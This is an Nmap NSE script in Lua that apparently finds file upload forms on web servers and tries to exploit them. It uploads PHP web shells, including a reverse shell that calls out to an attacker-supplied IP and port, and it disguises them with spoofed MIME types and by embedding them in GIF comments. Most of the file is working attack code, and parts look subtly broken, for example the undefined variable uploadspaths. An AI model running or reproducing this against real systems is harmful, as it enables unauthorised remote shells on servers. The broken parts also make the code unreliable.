local http = require "http"
local httpspider = require "httpspider"
local io = require "io"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Exploits insecure file upload forms in web applications using various techniques like changing the Content-type header or creating valid image files containing the payload in the comment.
]]

---
-- @usage nmap -p80 --script http-fileupload-exploiter.nse --script-args http-fileupload-exploiter.shell-ip=<shell_ip>,http-fileupload-exploiter.shell-port=<shell_port> <target>
--

local author = "Haroon Ahmad Awan"
local license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

-- Function to generate reverse shell payload
local function reverseShellPayload(ip, port)
    -- Customize the reverse shell payload with your IP and port
    return string.format("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", ip, port)
end

-- Add your custom payloads here
local payloads = {
    { filename = "shell.php", content = "<?php echo 'Shell Executed'; ?>" },
    { filename = "reverse_shell.php", content = reverseShellPayload(stdnse.get_script_args("http-fileupload-exploiter.shell-ip"), stdnse.get_script_args("http-fileupload-exploiter.shell-port")) },
    -- Add more payloads here
}

local listofrequests = {}

-- Escape for jsp and asp payloads.
local escape = function(s)
    return (s:gsub('%%', '%%%%'))
end

-- Represents an upload-request.
local function UploadRequest(host, port, submission, partofrequest, name, filename, mime, payload, check)
    local request = {
        host = host,
        port = port,
        submission = submission,
        mime = mime,
        name = name,
        filename = filename,
        partofrequest = partofrequest,
        payload = payload,
        check = check,
        uploadedpaths = {},
        success = 0,

        make = function(self)
            local options = { header = {} }
            options['header']['Content-Type'] = "multipart/form-data; boundary=AaB03x"
            options['content'] = self.partofrequest .. '--AaB03x\nContent-Disposition: form-data; name="' .. self.name .. '"; filename="' .. self.filename .. '"\nContent-Type: ' .. self.mime .. '\n\n' .. self.payload .. '\n--AaB03x--'

            stdnse.debug2("Making a request: Header: " .. options['header']['Content-Type'] .. "\nContent: " .. escape(options['content']))

            local response = http.post(self.host, self.port, self.submission, options, { no_cache = true })

            return response.body
        end,

        checkPayload = function(self, uploadspaths)
            for _, uploadpath in ipairs(uploadspaths) do
                local response = http.get(host, port, uploadpath .. '/' .. filename, { no_cache = true })

                if response.status ~= 404 then
                    if (response.body:match(self.check)) then
                        self.success = 1
                        table.insert(self.uploadedpaths, uploadpath)
                    end
                end
            end
        end,
    }
    table.insert(listofrequests, request)
    return request
end

-- Create customized requests for all of our payloads.
local function buildRequests(host, port, submission, name, mime, partofrequest, uploadspaths, image)

    for i, p in ipairs(payloads) do
        if image then
            p['content'] = string.gsub(image, '!!comment!!', escape(p['content']), 1, true)
        end
        UploadRequest(host, port, submission, partofrequest, name, p['filename'], mime, p['content'], p['check'])
    end
end

-- Make the requests that we previously created with buildRequests()
-- Check if the payloads were successful by checking the content of pages in the uploadspaths array.
local function makeAndCheckRequests(uploadspaths)

    local exit = 0
    local output = {"Successfully uploaded and executed payloads: "}

    for i = 1, #listofrequests, 1 do
        listofrequests[i]:make()
        listofrequests[i]:checkPayload(uploadspaths)
        if (listofrequests[i].success == 1) then
            exit = 1
            table.insert(output, " Filename: " .. listofrequests[i].filename .. ", MIME: " .. listofrequests[i].mime .. ", Uploaded on: ")
            for _, uploadedpath in ipairs(listofrequests[i].uploadedpaths) do
                table.insert(output, uploadedpath .. "/" .. listofrequests[i].filename)
            end
        end
    end

    if exit == 1 then
        return output
    end

    listofrequests = {}
end

local function prepareRequest(fields, fieldvalues)
    local filefield = 0
    local req = {}
    local value

    for _, field in ipairs(fields) do
        if field["type"] == "file" then
            -- FIXME: What if there is more than one <input type="file">?
            filefield = field
        elseif field["type"] == "text" or field["type"] == "textarea" or field["type"] == "radio" or field["type"] == "checkbox" then
            if fieldvalues[field["name"]] ~= nil then
                value = fieldvalues[field["name"]]
            else
                value = "SampleData0"
            end
            req[#req + 1] = ('--AaB03x\nContent-Disposition: form-data; name="%s";\n\n%s\n'):format(field["name"], value)
        end
    end

    return table.concat(req), filefield
end

action = function(host, port)

    local returntable = {}
    local result
    local fail = 0

    -- Automatically discover forms with file upload fields
    local formpaths = httpspider.get_file_upload_forms(host, port)

    for _, form in ipairs(formpaths) do
        local submission = form.submission
        local partofrequest, filefield = prepareRequest(form.fields, {})
        if filefield ~= 0 then
            -- Method (1): Upload payloads with different extensions
            buildRequests(host, port, submission, filefield.name, "text/plain", partofrequest, uploadspaths)
            result = makeAndCheckRequests(uploadspaths)
            if result then
                table.insert(returntable, result)
                break
            end

            -- Method (2): Upload payloads with different Content-type headers
            buildRequests(host, port, submission, filefield.name, "image/gif", partofrequest, uploadspaths)
            buildRequests(host, port, submission, filefield.name, "image/png", partofrequest, uploadspaths)
            buildRequests(host, port, submission, filefield.name, "image/jpeg", partofrequest, uploadspaths)
            result = makeAndCheckRequests(uploadspaths)
            if result then
                table.insert(returntable, result)
                break
            end

            -- Method (3): Create valid image files containing payloads
            local pixel = nmap.fetchfile("nselib/data/pixel.gif")
            if pixel then
                local fh = io.open(pixel, "rb")
                local pixelData = fh:read("a")
                fh:close()
                buildRequests(host, port, submission, filefield.name, "image/gif", partofrequest, uploadspaths, pixelData)
                result = makeAndCheckRequests(uploadspaths)
                if result then
                    table.insert(returntable, result)
                else
                    fail = 1
                end
            end
        end
    end

    if fail == 1 then
        table.insert(returntable, {"Failed to upload and execute a payload."})
    end

    if next(returntable) then
        return returntable
    end
end
